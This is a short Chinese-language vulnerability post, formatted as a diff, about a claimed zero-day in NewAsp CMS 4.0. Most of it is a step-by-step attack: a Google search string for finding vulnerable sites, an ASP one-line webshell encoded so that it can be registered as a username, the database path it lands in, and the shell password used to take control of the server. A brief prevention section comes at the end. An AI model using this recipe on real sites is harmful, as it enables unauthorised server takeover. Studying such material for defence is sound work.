@@ -1,0 +1,25 @@
+NewAsp CMS Version 4.0最新0day（新云4.0漏洞）
+
+[NewAsp CMS Version 4.0最新0day（新云4.0漏洞） 全文]概述： 
+
+由于新云4.0对注册用户未过滤特殊字符，造成黑客通过脚本编码转换将一句话木马写入数据库文件，从而获得 WEBSHELL权限。 
+
+测试： 
+
+1. 打开www.google.cn 搜索关键字:Powered By NewAsp CMS Version 4.0 或 新云问吧 
+
+2. 将<%execute request("a")%> 编码转换为 ┼攠数畣整爠焕敌瑳∨≡┩忾 
+
+3. 以┼攠数畣整爠焕敌瑳∨≡┩忾 为用户名注册帐户 
+
+4. 用一句话连接端连接 目标站点url/ask/data/ask_newasp.asa ,密码为 a 
+
+5.上传脚本大马或者执行其它操作，这里WEBSHELL权限已经获得。 
+
+预防： 
+
+1.严格过滤注册用户名， 限制注册用户名长度及禁止特殊符号。 
+
+2.更改ask/data/ask_newasp.asa 路径及名称。 
+
+3.给文件夹做权限设置，去除公共写入权限。 
